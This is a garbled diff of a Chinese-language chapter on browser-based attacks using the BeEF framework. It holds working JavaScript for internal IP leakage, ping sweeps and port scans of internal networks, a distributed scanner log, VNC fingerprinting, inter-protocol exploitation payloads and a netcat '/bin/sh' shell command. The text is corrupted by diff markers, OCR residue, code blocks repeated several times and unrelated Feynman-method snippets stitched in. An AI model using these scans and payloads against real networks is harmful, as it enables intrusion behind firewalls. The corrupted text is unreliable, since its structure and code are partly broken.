-在 BeEF 中，Java 代码已经被编译成 Java 类文件。当模块执行时，它会使用 beef.dom.attachApplet() JavaScript 函数将类文件加载到目标浏览器中。Figure 10-1 展示了最新 Java 1.6 插件在“获取内部 IP”模块上的输出效果。
-
-<｜begin▁of▁sentence｜># 图片文字内容
-
-### 图片文字内容
+在 BeEF 中，Java 代码已经被编译成 Java 类文件。当模块执行时，它会使用 `beef.dom.attachApplet()` JavaScript 函数将类文件加载到目标浏览器中。Figure 10-1 展示了最新 Java 1.6 插件在“获取内部 IP”模块上的输出效果。
 
 ### 图片文字内容
 
 - **Figure 10-1** 的标题是“Get Internal IP”命令模块输出。
-
-- 图片中有一张图片，文件名为 c10f001.tif，显示的是一个网页界面，其中包含一个标题为“Get Internal IP”的模块，显示的是当前浏览器的内部 IP 地址。
-
+- 图片中有一张图片，文件名为 `c10f001.tif`，显示的是一个网页界面，其中包含一个标题为“Get Internal IP”的模块，显示的是当前浏览器的内部 IP 地址。
 - 图片下方有一行文字：“end figure”。
 
 ### 图片文字内容
 
 - 你可能记得，第 5 章探讨了 Web Real Time Communications（WebRTC）标准，用于在社交工程攻击中与计算机的网络摄像头进行接口交互。
-
 - 另一个被提议的 WebRTC 特性是对等连接组件。
 
-3
+在 DOM 中，这项功能通过 `window.RTCPeerConnection`、`window.webkitRTCPeerConnection` 或 `window.mozRTCPeerConnection` 对象实现，具体取决于浏览器。该技术的目标是为丰富的 Web 应用提供一种点对点通信的方法。例如，它允许在浏览器内进行视频聊天，而无需依赖第三方技术，如 Flash。
 
-在 DOM 中，这项功能通过 window.RTCPeerConnection、window.webkitRTCPeerConnection 或 window.mozRTCPeerConnection 对象实现，具体取决于浏览器。该技术的目标是为丰富的 Web 应用提供一种点对点通信的方法。例如，它允许在浏览器内进行视频聊天，而无需依赖第三方技术，如 Flash。
+在该功能的核心是交互式连接建立（ICE）框架。ICE 设计用于让浏览器能够直接与其他浏览器进行通信。当然，防火墙和 NAT 技术通常会阻止两个孤立浏览器之间的直接通信。因此，会话穿越实用程序（STUN）和通过 NAT 进行中继（TURN）概念被构建。
 
-在该功能的核心是交互式连接建立（ICE）框架。ICE 设计用于让浏览器能够直接与其他浏览器进行通信。当然，防火墙和 NAT 技术通常会阻止两个孤立浏览器之间的直接通信。因此，会话穿越实用程序（STUN）和通过 NAT 进行中继（TURN）概念被构建。4
+该想法基于中继或连接服务器作为两个浏览器之间的中间点。为了帮助两个浏览器之间的初始握手，使用会话发现协议（SDP）。SDP 标准定义了两个方之间需要的信息的共同语言，以便它们可以相互建立连接。2013 年，Nathan Vander Wilt 发现 `RTCPeerConnection` 的实现，特别是用于构建 SDP 消息的函数，可以用来泄露浏览器的内部 IP 地址。以下代码片段演示了如何利用此技术获取内部 IP 地址：
 
-该想法基于中继或连接服务器作为两个浏览器之间的中间点。为了帮助两个浏览器之间的初始握手，使用会话发现协议（SDP）5。SDP 标准定义了两个方之间需要的信息的共同语言，以便它们可以相互建立连接。2013 年，Nathan Vander Wilt6 发现 RTCPeerConnection 的实现，特别是用于构建 SDP 消息的函数，可以用来泄露浏览器的内部 IP 地址。以下代码片段演示了如何利用此技术获取内部 IP 地址：
-
-<|ref|>code<|/ref|><|det|>[[23, 350, 970, 775]]<|/det|>
-
-这段代码首先创建一个名为 rtc 的 RTCPeerConnection 对象。随后为它绑定一个处理程序，用于检测到 ICE 候选者时的事件。代码随后创建一个 SDP 请求，通常需要通过中继服务器提交。但由于没有设置中继服务器，请求被包含在内部。然后解析 SDP 字符串以提取内部 IP 地址。
+这段代码首先创建一个名为 `rtc` 的 `RTCPeerConnection` 对象。随后为它绑定一个处理程序，用于检测到 ICE 候选者时的事件。代码随后创建一个 SDP 请求，通常需要通过中继服务器提交。但由于没有设置中继服务器，请求被包含在内部。然后解析 SDP 字符串以提取内部 IP 地址。
 
 有了这些详细信息，可以对内部网络进行更精准和更具针对性的攻击。然而，如果 Java 或 WebRTC 不可用，情况并未结束！你仍然有方法来分析潜在的内部 IP 范围。
 
@@ -12608,14 +12705,11 @@ if (condVar > someVal) {console.log("xxx")}
 
 发现浏览器的内部 IP 地址虽然有帮助，但不是你攻击内部网络的关键要求。在超过 1700 万（RFC1918 地址空间）的可能地址中寻找目标地址可能看起来是不可能完成的任务。然而，你可以通过一些简单的推断将这个问题缩小为可实现的部分。
 
-第一种缩小潜在目标范围的方法是基于教育性猜测内部网络范围。通常不会看到 10.0.0.0/24、10.1.1.0/24 或 192.168.1.0/24 这些范围。这些范围是很好的起点。当然，你需要根据从浏览器中提取的细节来确认你的猜测。
+第一种缩小潜在目标范围的方法是基于教育性猜测内部网络范围。通常不会看到 `10.0.0.0/24`、`10.1.1.0/24` 或 `192.168.1.0/24` 这些范围。这些范围是很好的起点。当然，你需要根据从浏览器中提取的细节来确认你的猜测。
 
-2009 年，Robert Hansen 发现 7，当向内部可用的 IP 发出 XMLHttpRequest 跨域请求时，响应会很快返回，时间顺序为秒。但如果主机不可用，响应会返回较长的延迟。由于这两种情况之间的时间差很大，你可以根据响应的时间来判断内部网络主机是否在线。
+2009 年，Robert Hansen 发现，当向内部可用的 IP 发出 `XMLHttpRequest` 跨域请求时，响应会很快返回，时间顺序为秒。但如果主机不可用，响应会返回较长的延迟。由于这两种情况之间的时间差很大，你可以根据响应的时间来判断内部网络主机是否在线。
 
 你可以使用以下代码，这是对 Hansen 方法的增强版本，来发现挂钩浏览器的当前子网，而无需知道其内部 IP：
-
-
-
 
 ```javascript
 var ranges = [
@@ -12693,16 +12787,111 @@ for (var i = 0; i < ranges.length; i++) {
 
 The WebWorker controller code, used to coordinate the WebWorkers, is the following:
 
-
-
 if(!!window.Worker){
 
+// WebWorker 代码位置
+
+var wwloc = "http://browserhacker.com/network-discovery/worker.js";
+
+var workersDone = 0;
+
+var totalWorkersDone = 0;
+
+var start = 0;
+
+// 并行生成的 WebWorker 数量
+
+var workers_number = 5;
+
+// 每 0.5 秒调用一次 checkComplete()
+
+var checkCompleteDelay = 1000;
+
+var start = new Date().getTime();
+
+var xhr_timeout = 5000;
+
+var lowerbound = 1;
+
+var upperbound = 50; // 创建 50 个 XHR 大约需要 5 秒。
+
+var discovered_hosts = [];
+
+var subnet =  "192.168.0.0";
+
+var worker_i = 0;
+
+/* 在 'start' 位置新建 WebWorker 以处理数据获取 */
+
+function spawnWorker(lowerbound, upperbound){
+
+   worker_i++; 
+
+   // 使用 eval 动态创建 WebWorker 变量
+
+   eval("var w" + worker_i + " = new Worker('" + wwloc + "');");
+
+   eval("w" + worker_i + ".onmessage = function(oEvent){" +
+
+   "if(oEvent.data['completed']){workersDone++;totalWorkersDone++;}else{" +
+
+   "var host = oEvent.data['host'];" + 
+
+   "var time = oEvent.data['time'];" +
+
+   "console.log('Discovered host ['+host+'] in ['+time+'] ms');" + 
+
+   "discovered_hosts.push(host);"+
+
+   "}};");
+
+   eval("var data = {'xhr_timeout':" + xhr_timeout + ", 'subnet':'" + subnet +
+
+
+
+``` 
+    "', 'lowerbound':" + lowerbound +", 'upperbound':" + upperbound + "};");
+   eval("w" + worker_i + ".postMessage(data);");
+   console.log("Spawning worker for range: " + subnet);
+}
+function checkComplete(){
+ if(workersDone === workers_number){
+ console.log("Current workers have completed.");
+ console.log("Discovery finished on network " + subnet + "/24");
+   clearInterval(checkCompleteInterval);
+   var end = new Date().getTime();
+   //window.stop();
+   console.log("Total time [" + (end-start)/1000 + "] seconds.");
+   console.log("Discovered hosts:\n" + discovered_hosts.join("\n"));
+ }else{
+  console.log("Waiting for workers to complete..." +
+   "Workers done ["+workersDone+"]");
+ }
+}
+function scanSubnet(){
+ console.log("Discovery started on network " + subnet + "/24");
+ spawnWorker(1, 50);
+ spawnWorker(51, 100);
+ spawnWorker(101, 150);
+ spawnWorker(150, 200);
+ spawnWorker(201, 254);
+}
+// 首次调用
+scanSubnet();
+var checkCompleteInterval = setInterval(function(){
+  checkComplete()}, checkCompleteDelay);
+}else{
+console.log("WebWorker not supported!");
+}
+```
+
+``` 
+if(!!window.Worker){
 // WebWorker 代码位置
 var wwloc = "http://browserhacker.com/network-discovery/worker.js";
 var workersDone = 0;
 var totalWorkersDone = 0;
 var start = 0;
-
 // 并行生成的 WebWorker 数量
 var workers_number = 5;
 // 每 0.5 秒调用一次 checkComplete()
@@ -12714,7 +12903,6 @@ var upperbound = 50; // 创建 50 个 XHR 大约需要 5 秒。
 var discovered_hosts = [];
 var subnet =  "192.168.0.0";
 var worker_i = 0;
-
 /* 在 'start' 位置新建 WebWorker 以处理数据获取 */
 function spawnWorker(lowerbound, upperbound){
    worker_i++; 
@@ -12732,7 +12920,6 @@ function spawnWorker(lowerbound, upperbound){
    eval("w" + worker_i + ".postMessage(data);");
    console.log("Spawning worker for range: " + subnet);
 }
-
 function checkComplete(){
  if(workersDone === workers_number){
  console.log("Current workers have completed.");
@@ -12747,7 +12934,6 @@ function checkComplete(){
    "Workers done ["+workersDone+"]");
  }
 }
-
 function scanSubnet(){
  console.log("Discovery started on network " + subnet + "/24");
  spawnWorker(1, 50);
@@ -12756,94 +12942,14 @@ function scanSubnet(){
  spawnWorker(150, 200);
  spawnWorker(201, 254);
 }
-
 // 首次调用
 scanSubnet();
-
 var checkCompleteInterval = setInterval(function(){
   checkComplete()}, checkCompleteDelay);
-
 }else{
 console.log("WebWorker not supported!");
 }
 ```
-
-```
-if(!!window.Worker){
-
-// WebWorker 代码位置
-var wwloc = "http://browserhacker.com/network-discovery/worker.js";
-var workersDone = 0;
-var totalWorkersDone = 0;
-var start = 0;
-
-// 并行生成的 WebWorker 数量
-var workers_number = 5;
-// 每 0.5 秒调用一次 checkComplete()
-var checkCompleteDelay = 1000;
-var start = new Date().getTime();
-var xhr_timeout = 5000;
-var lowerbound = 1;
-var upperbound = 50; // 创建 50 个 XHR 大约需要 5 秒。
-var discovered_hosts = [];
-var subnet =  "192.168.0.0";
-var worker_i = 0;
-
-/* 在 'start' 位置新建 WebWorker 以处理数据获取 */
-function spawnWorker(lowerbound, upperbound){
-   worker_i++; 
-   // 使用 eval 动态创建 WebWorker 变量
-   eval("var w" + worker_i + " = new Worker('" + wwloc + "');");
-   eval("w" + worker_i + ".onmessage = function(oEvent){" +
-   "if(oEvent.data['completed']){workersDone++;totalWorkersDone++;}else{" +
-   "var host = oEvent.data['host'];" + 
-   "var time = oEvent.data['time'];" +
-   "console.log('Discovered host ['+host+'] in ['+time+'] ms');" + 
-   "discovered_hosts.push(host);"+
-   "}};");
-   eval("var data = {'xhr_timeout':" + xhr_timeout + ", 'subnet':'" + subnet +
-    "', 'lowerbound':" + lowerbound +", 'upperbound':" + upperbound + "};");
-   eval("w" + worker_i + ".postMessage(data);");
-   console.log("Spawning worker for range: " + subnet);
-}
-
-function checkComplete(){
- if(workersDone === workers_number){
- console.log("Current workers have completed.");
- console.log("Discovery finished on network " + subnet + "/24");
-   clearInterval(checkCompleteInterval);
-   var end = new Date().getTime();
-   //window.stop();
-   console.log("Total time [" + (end-start)/1000 + "] seconds.");
-   console.log("Discovered hosts:\n" + discovered_hosts.join("\n"));
- }else{
-  console.log("Waiting for workers to complete..." +
-   "Workers done ["+workersDone+"]");
- }
-}
-
-function scanSubnet(){
- console.log("Discovery started on network " + subnet + "/24");
- spawnWorker(1, 50);
- spawnWorker(51, 100);
- spawnWorker(101, 150);
- spawnWorker(150, 200);
- spawnWorker(201, 254);
-}
-
-// 首次调用
-scanSubnet();
-
-var checkCompleteInterval = setInterval(function(){
-  checkComplete()}, checkCompleteDelay);
-
-}else{
-console.log("WebWorker not supported!");
-}
-```
-
-
-
 
 -   [pingSweep Java Applet](https://example.org/pingSweep) 附加到挂钩页面的 DOM 后，会调用 `document.pingSweep.getAliveHosts()`。如果 Applet 还未完成，则之前的调用会抛出异常，代码会等待 1 秒后再次尝试。此过程会持续进行，直到 Applet 返回所有已存活的主机列表，或 30 秒的超时时间到达。无论哪种情况，随后都会通过调用 `beef.dom.detachApplet()` 清理 DOM。
 
@@ -12861,28 +12967,23 @@ SPI Dynamics8 于 2006 年发布了首篇公开的浏览器端口扫描研究论
 scanPort: function(callback, target, port, timeout){
  var timeout = (timeout == null)?100:timeout;
  var img = new Image();
-
  img.onerror = function () {
     if (!img) return;
     img = undefined;
     callback(target, port, 'open');
  };
-
  img.onload  = img.onerror;
  // note that http:// is used
  img.src = 'http://' + target + ':' + port;
-
  setTimeout(function () {
     if (!img) return;
     img = undefined;
     callback(target, port, 'closed');
  }, timeout);
 },
-
 // ports_str 例如 "80,8080,8443"
 scanTarget: function(callback, target, ports_str, timeout){
  var ports = ports_str.split(",");
-
  for (index = 0; index < ports.length; index++) {
     this.scanPort(callback, target, ports[index], timeout);
  };
@@ -12895,31 +12996,21 @@ scanTarget: function(callback, target, ports_str, timeout){
 
 除了 Same Origin Policy（SOP）之外，现代浏览器还有一项旨在防止对非 HTTP 服务发起攻击的限制特性——端口禁禁。该特性禁止向诸如 22、25、110、143 等特定端口发送请求，以阻止浏览器向已知端口上的服务发起连接。
 
-start feature 
-
-* * *
+---
 
 **Port Banning** 端口禁禁是浏览器实现的安全措施，用于拒绝连接非标准 TCP 端口的请求。如果你在端口 143（IMAP 默认端口，非 HTTP）上运行一个 Web 服务器，则无法通过浏览器连接它。大多数 Web 服务器在 80、443、8080、8443 等端口提供网页内容。也有例外，例如 Web Service 及少数其他应用或协议。端口禁禁的实现因浏览器而异（不出所料）。此外，还可以放宽此安全措施，但与其他安全控制不同，它并不通过 HTTP 头、HTML 标签或属性（如 SOP）来配置，而是在浏览器的核心配置选项中完成。在 Firefox 中，可以通过访问 `about:config` 并向 `network.security.ports.banned.override` 属性中添加端口来解除禁用；在 Chrome 中则需要以命令行参数启动浏览器，例如 `--explicitly-allowed-ports=PORT`。
 
-* * *
-
-end feature 
+---
 
 之前的 JavaScript 端口扫描实现使用了 HTTP 协议来连接自定义 TCP 端口。当然，如果目标端口被浏览器的端口禁禁列表禁止，则该方法不可行。Figure 10-6 展示了在 Firefox 中尝试通过 `http://172.16.37.147:143` 连接时的错误示例。Figure 10-7 展示了 Netcat 监听器（未接收到来自 Firefox 的任何数据）。
-
-start figure 
 
 **Figure 10-6:** 尝试使用 HTTP 协议连接端口 143 时的错误
 
 ![c10f006.tif](img/c10f006.png)
 
-end figure  start figure 
-
 **Figure 10-7:** Netcat 监听器（未接收到任何数据）
 
 ![c10f007.tif](img/c10f007.png)
-
-end figure 
 
 端口禁禁阻止向特定 TCP 端口发送请求，是大多数浏览器实现的安全特性。但与 SOP 类似，端口禁禁也存在实现差异。一个典型的差异是不同浏览器禁禁的端口不同。例如，Chrome 与 Safari 会阻止 IRC 默认端口 6667，而 Firefox 与 Internet Explorer 则允许该端口。基于此行为的 IRC NAT 钻探技术以及跨协议通信与利用，正是利用了这些差异（后文将进一步说明）。
 
@@ -12931,118 +13022,171 @@ end figure
 
 此外，还需要配置 iptables 将所有 TCP 端口转发到服务器监听的端口。假设脚本绑定在 `192.168.0.3:10000`，则下面的 iptables 规则将所有流量转发至该端口：
 
-```
+``` 
 iptables -A PREROUTING -t nat -i eth1 -p tcp --dport\
 1:65535 -j DNAT --to-destination 192.168.0.3:10000
 ```
 
 这意味着无需为每个 TCP 端口单独部署监听器。下面的 Ruby 代码会在 TCP 端口 10000 上监听：
 
-
-
-
 -   [使用费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
 
 1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
-```
+``` 
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 The `dist_pscanner.rb` script, available from [`https://browserhacker.com`](https://browserhacker.com), provides an interactive way to conduct a distributed port scan. It asks for which browsers to distribute the scan over, the target IP address, and the TCP port range. The script then splits up the load, and queues up the commands for each of the selected browsers. Here is the command using just a single browser (inputs are highlighted):
 
 ``` 
 $ ruby ./dist_pscanner.rb 
+
 [>>>] BeEF Distributed Port Scanner] 
+
  [+] Retrieved RESTful API token: 
+
      006c1aed13b124d0c1c8fb50c98fb35d04a78d5e 
+
 [+] Retrieved Hooked Browsers list. Online: 3 
+
 [+] Retrieved 185 available command modules 
 
 [+] Online Browsers: 
+
 [1] 127.0.0.1 - C28 Macintosh 
+
 [2] 192.168.1.101 - C28 Windows 7 
+
 [3] 127.0.0.1 - C28 Macintosh 
 
 [+] Provide a comma separated list of browsers to use (i.e. 1 or 1,3 or 
+
     1,2,3 etc): 
+
 1 
+
 [+] Using: 
+```
+
+
+
 [1] 127.0.0.1 - C28 Macintosh 
 
 [+] Enter target IP to port scan: 
+
 192.168.1.254 
 
 [+] Enter target ports to scan (i.e. 1-65535 or 22-80 or 1-1024): 
+
 70-80 
 
 [+] Split will be as follows: 
+
 [1] 70-80 
 
 [+] Ready to proceed? <Enter> 
 
 [+] Starting port scan against 192.168.1.254 from 70-80 [1] 
+
 [+] Scan queued... 
+
 [1] port=Scanning: 70,71,72,73,74,75,76,77,78,79,80 
+
 [1] port=WebSocket: Port 80 is OPEN (http) 
+
 [1] Scan Finished in 43995 ms 
+
 [+] All Scans Finished!! 
+
 Time Taken: 60.248801 
+
+```
+In this example, a single Chrome browser scanned an IP address’s ports from 70 to 80 in about 60 seconds. If the same is executed again using three hooked browsers, the response is slightly different:
 ```
 
-In this example, a single Chrome browser scanned an IP address’s ports from 70 to 80 in about 60 seconds. If the same is executed again using three hooked browsers, the response is slightly different:
-
-``` 
 $ ruby ./dist_pscanner.rb 
+
 [>>>] BeEF Distributed Port Scanner] 
+
  [+] Retrieved RESTful API token: 
+
      006c1aed13b124d0c1c8fb50c98fb35d04a78d5e 
+
 [+] Retrieved Hooked Browsers list. Online: 3 
+
 [+] Retrieved 185 available command modules 
 
 [+] Online Browsers: 
+
 [1] 127.0.0.1 - C28 Macintosh 
+
 [2] 192.168.1.101 - C28 Windows 7 
+
 [3] 127.0.0.1 - C28 Macintosh 
 
 [+] Provide a comma separated list of browsers to use (i.e. 1 or 1,3 or 
+
     1,2,3 etc): 
+
 1,2,3 
+
 [+] Using: 
+
 [1] 127.0.0.1 - C28 Macintosh 
+
 [2] 192.168.1.101 - C28 Windows 7 
+
 [3] 127.0.0.1 - C28 Macintosh 
 
 [+] Enter target IP to port scan: 
+
 192.168.1.254 
 
 [+] Enter target ports to scan (i.e. 1-65535 or 22-80 or 1-1024): 
+
 70-80 
 
 [+] Split will be as follows: 
+
 [1] 70-73 
+
 [2] 74-77 
+
 [3] 78-80 
 
 [+] Ready to proceed? <Enter> 
 
 [+] Starting port scan against 192.168.1.254 from 70-73 [1] 
+
 [+] Scan queued... 
+
 [+] Starting port scan against 192.168.1.254 from 74-77 [2] 
+
 [+] Scan queued... 
+
 [+] Starting port scan against 192.168.1.254 from 78-80 [3] 
+
 [+] Scan queued... 
+
 [1] port=Scanning: 70,71,72,73 
+
 [2] port=Scanning: 74,75,76,77 
+
 [3] port=Scanning: 78,79,80 
+
 [3] port=CORS: Port 80 is OPEN (http) 
+
 [3] port=WebSocket: Port 80 is OPEN (http) 
+
 [2] Scan Finished in 14800 ms 
+
 [3] Scan Finished in 11997 ms 
+
 [1] Scan Finished in 15998 ms 
+
 [+] All Scans Finished!! 
+
 Time Taken: 32.306009 
 ```
 
@@ -13062,12 +13206,11 @@ To help refine these assumptions, perhaps even to the point of differentiating b
 
 You start with analyzing the amount of time a service requires to close a TCP connection—monitoring when the status of the XMLHttpRequest object you use is equal to 4 (done).19 Detecting version differences, say between UltraVNC 1.0.9 and 1.1.9, is unrealistic because the timing difference (if any) will be too minimal. However, detecting different implementations, like identifying UltraVNC or TightVNC, is a plausible option. You can use the following code as a starting point:
 
-``` 
+```
 var target = "172.16.37.151"; 
 var port = 5900; 
 var count = 1; 
 var time = 0; 
-
 function doRequest(){
 if(count <= 3){
     var xhr = new XMLHttpRequest(); 
@@ -13076,7 +13219,6 @@ if(count <= 3){
         port + "/" + Math.random()); 
     var start = new Date().getTime(); 
     xhr.send("foo"); 
-        
     xhr.onreadystatechange = function () { 
      if (xhr.readyState == 4) { 
          var end = new Date().getTime(); 
@@ -13088,18 +13230,17 @@ if(count <= 3){
 }else{
     console.log("COMPLETED. Average: " + time/3); 
 } 
-
 doRequest(); 
-``` 
+```
 This code is simply sending three XHRs to the same target port, in this case 5900. It then monitors how long it takes for the service to close the connection. Finally, the average timing for the service to close the connection is calculated. Figure 10-10 shows the code targeting TightVNC 2.7.1, and Figure 10-11 shows the same test on UltraVNC 1.1.9.
 
- start figure 
+start figure 
 
 **Figure 10-10:** Fingerprinting TightVNC 
 
 ![c10f010.tif](img/c10f010.png) 
 
- end figure   start figure 
+end figure   start figure 
 
 **Figure 10-11:** Fingerprinting UltraVNC 
 
@@ -13111,20 +13252,15 @@ The third fingerprinting method is by implementing Inter-protocol Communication 
 
 # Attacking Non-HTTP Services
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
--   [伪造的 DCC 请求提交后，路由器随后允许来自 browserhacker.com 的入站流量在 22 端口上。该流量被重定向到内部服务器。最终结果是边界控制被修改，允许外部流量访问此前受保护的内部系统，使 IP 访问控制列表失效。](https://browserhacker.com)
+- [伪造的 DCC 请求提交后，路由器随后允许来自 browserhacker.com 的入站流量在 22 端口上。该流量被重定向到内部服务器。最终结果是边界控制被修改，允许外部流量访问此前受保护的内部系统，使 IP 访问控制列表失效。](https://browserhacker.com)
 
 Leppens 还贡献了一个利用 NAT Pinning 的 BeEF 模块。
 
@@ -13138,9 +13274,9 @@ NAT Pinning 攻击是一个很好的例子，说明从网络中浏览器发起�
 
 在大多数情况下，成功的 IPC 条件更多取决于开发者的实现决策，而非协议规范本身。这些条件实际上非常简单。要实现两种不同协议之间的通信，必须满足以下前提：
 
-*   目标协议实现具备容错能力
+* 目标协议实现具备容错能力
 
-*   能够将目标协议的数据封装进 HTTP 请求
+* 能够将目标协议的数据封装进 HTTP 请求
 
 在浏览器环境中，这通常涉及向一个监听服务提交一个 HTTP 请求，该服务不使用 HTTP 协议。随后，请求（或其中一部分）会被正确解析。
 
@@ -13148,8 +13284,11 @@ NAT Pinning 攻击是一个很好的例子，说明从网络中浏览器发起�
 
 ```
 READ <file_path>
+
 WRITE <content> <file_path>
 ```
+
+
 
 要判断该协议实现是否适合 IPC，你需要了解哪些条件会导致其丢弃 TCP 连接。如果下面的（非协议）数据被发送且连接仍保持活动，则说明该实现有潜力，值得进一步探索：
 
@@ -13161,7 +13300,9 @@ ADD foobar
 
 ```
 ADD foo
+
 ADD bar
+
 WRITE browserhacker.com /opt/protocol/browserhacker
 ```
 
@@ -13169,9 +13310,13 @@ WRITE browserhacker.com /opt/protocol/browserhacker
 
 ```
 POST / HTTP/1.1
+
 Host: 192.168.1.130:4444
+
 User-Agent: Mozilla/5.0 
+
 Content-type: text/plain
+
 Content-Length: 51
 
 WRITE browserhacker.com /opt/protocol/browserhacker
@@ -13179,21 +13324,19 @@ WRITE browserhacker.com /opt/protocol/browserhacker
 
 HTTP 请求头将被丢弃，连同 CRLF 一起，而请求的最后一行会被目标协议正确处理。正如你所见，POST 请求让你可以在请求体中自由添加任意数据，而无需在前面预置标准 HTTP 头。正是在请求体中，你才真正掌控与目标协议的通信。这是浏览器通过 IPC 与目标协议通信的核心概念。
 
-你的 POST 请求必须将 Content-Type 设置为 text/plain 或 multipart/form-data。这是为了确保可以通过 XMLHttpRequest（或 HTML 表单）跨源发送请求，如第 9 章“发送跨源请求”节中讨论。这两种 Content-Type 不限制你可以使用的数据格式，而 application/x-www-form-urlencoded 则限制你必须使用 body 结构为 parameter=value，并使用 & 连接额外参数。空格等字符的编码也可能出现问题。使用 text/plain 或 multipart/form-data，你对请求体的内容拥有完全自由，例如可以添加 CR/LF 行和空格。
+你的 POST 请求必须将 `Content-Type` 设置为 `text/plain` 或 `multipart/form-data`。这是为了确保可以通过 `XMLHttpRequest`（或 HTML 表单）跨源发送请求，如第 9 章“发送跨源请求”节中讨论。这两种 `Content-Type` 不限制你可以使用的数据格式，而 `application/x-www-form-urlencoded` 则限制你必须使用 body 结构为 `parameter=value`，并使用 `&` 连接额外参数。空格等字符的编码也可能出现问题。使用 `text/plain` 或 `multipart/form-data`，你对请求体的内容拥有完全自由，例如可以添加 CR/LF 行和空格。
 
-你有两种方式在浏览器中发送跨源 text/plain 或 multipart/form-data POST 请求。第一种方式是动态创建 HTML 表单，并使用 JavaScript 提交。BeEF 的 JavaScript API 提供了 createIframeIpecForm() 方法来实现：
+你有两种方式在浏览器中发送跨源 `text/plain` 或 `multipart/form-data` POST 请求。第一种方式是动态创建 HTML 表单，并使用 JavaScript 提交。BeEF 的 JavaScript API 提供了 `createIframeIpecForm()` 方法来实现：
 
 ```
 createIframeIpecForm: function(rhost, rport, path, commands){
  // 创建一个不可见的 Iframe 元素，HTML 表单将放置在此
  var iframeIpec = beef.dom.createInvisibleIframe();
-
  // 创建 HTML 表单。注意 enctype 属性。
  var formIpec = document.createElement('form');
  formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
  formIpec.setAttribute('method',  'POST');
  formIpec.setAttribute('enctype', 'multipart/form-data');
-
  // 创建 textarea 元素
  // 用于添加 POST body
  input = document.createElement('textarea');
@@ -13202,7 +13345,6 @@ createIframeIpecForm: function(rhost, rport, path, commands){
  formIpec.appendChild(input);
  iframeIpec.contentWindow.document.body.appendChild(formIpec);
  formIpec.submit();
-
  return iframeIpec;
 }
 ```
@@ -13213,9 +13355,9 @@ createIframeIpecForm: function(rhost, rport, path, commands){
 beef.dom.createIframeIpecForm(host, port, path, commands);
 ```
 
-注意，大多数情况下 path 参数并不需要。commands 参数保存你想在 POST 请求体中发送的数据。
+注意，大多数情况下 `path` 参数并不需要。`commands` 参数保存你想在 POST 请求体中发送的数据。
 
-第二种在浏览器中发起 IPC 的方式是使用 XMLHttpRequest 对象。下面的代码展示了一个示例：
+第二种在浏览器中发起 IPC 的方式是使用 `XMLHttpRequest` 对象。下面的代码展示了一个示例：
 
 ```
 var xhr = new XMLHttpRequest();
@@ -13227,7 +13369,7 @@ xhr.setRequestHeader("Accept-Language", "en");
 xhr.send(command + "\r\n");
 ```
 
-command 变量包含你想发送给协议的数据，后面跟一个回车符和换行符（\\r\\n）。许多协议使用这些字符来标记当前命令的结束。
+`command` 变量包含你想发送给协议的数据，后面跟一个回车符和换行符（`\r\n`）。许多协议使用这些字符来标记当前命令的结束。
 
 这便是浏览器通过 IPC 与虚构协议进行通信的一个例子。该协议实现支持了一些属性，使得此类攻击成为可能。下面的章节将更详细地探讨这些前提条件。
 
@@ -13241,9 +13383,7 @@ IPC 的第一个挑战是确保目标协议实现能够容忍错误。这通常�
 
 Postfix 版本 2.7.0 对错误的容忍度甚至低于 Exim。它一旦检测到非 SMTP 命令，就会立即断开与客户端的连接：
 
-
-
-
+```
 Aug 10 06:38:17 bt postfix/smtpd[3179]:
 connect from browservictim.com[172.16.37.1]
 
@@ -13253,9 +13393,8 @@ warning: non-SMTP command from browservictim.com
 
 Aug 10 06:38:17 bt postfix/smtpd[3179]:
 disconnect from browservictim.com[172.16.37.1]
-[/content]
+```
 
-[content]
 虽然这些 SMTP 服务不具备容错性，但有不少 IMAP 服务已被证明能够满足这一要求。后文将讨论 Eudora IMAP 实现，并展示一个容错协议的示例。
 
 在验证协议实现是否能够妥善处理多余数据后，你需要测试第二个强制性要求。这指的是协议能够封装数据的能力，相关概念将在下一节中进一步探讨。
@@ -13268,17 +13407,13 @@ disconnect from browservictim.com[172.16.37.1]
 
 遗憾的是，JavaScript 无法显式打开原始 TCP 套接字，因此你只能通过 IPC 来实现与目标协议的通信。此外，在处理协议间利用（Inter‑protocol Exploitation）时，你常常需要处理 Shellcode，而 Shellcode 本质上是二进制数据。二进制数据在 JavaScript 中并不易于处理。
 
- start feature 
-
 * * *
 
 **The Future of Raw TCP Sockets from the Browser** 目前浏览器中没有直接发送原始 TCP 数据的方法。但这并不意味着浏览器开发者没有在研究这项能力。Mozilla WebAPI 团队目前正在研究多项新技术，包括 TCP Socket API。你可以在 [`wiki.mozilla.org/WebAPI`](https://wiki.mozilla.org/WebAPI) 阅读更多关于 TCP Socket API 以及其他新特性的信息。
 
 * * *
 
- end feature 
-
-Firefox 通过新增 `sendAsBinary()` 方法，在 XMLHttpRequest 对象上支持发送二进制数据。该方法也在第 9 章的 Cross‑origin GlassFish Remote Command Execution 部分中被探讨。
+Firefox 通过新增 `sendAsBinary()` 方法，在 `XMLHttpRequest` 对象上支持发送二进制数据。该方法也在第 9 章的 Cross‑origin GlassFish Remote Command Execution 部分中被探讨。
 
 ```
 if (!XMLHttpRequest.prototype.sendAsBinary) {
@@ -13311,7 +13446,9 @@ nc -lvp 7777 -e /bin/sh
 
 ```
 #foobar
+
 foobar: command not found
+
 #
 ```
 
@@ -13343,7 +13480,6 @@ body2 = "__END_OF_POSIX_IPC__</div><s"+"cript>window.location='" +
 parent + "#ipc_result='+encodeURI(" +
 "document.getElementById(\\\"ipc_content\\\").innerHTML);</"
 +"script></body></html>";
-
 [...]
 // 返回 ipc_content，执行命令并把结果（使用 head -c SIZE 限制）发送回
 "echo \"" + body1 + "\";(" + cmd + ")|head -c "+size+" ; );
@@ -13351,7 +13487,6 @@ poster.appendChild(response);
 [...]
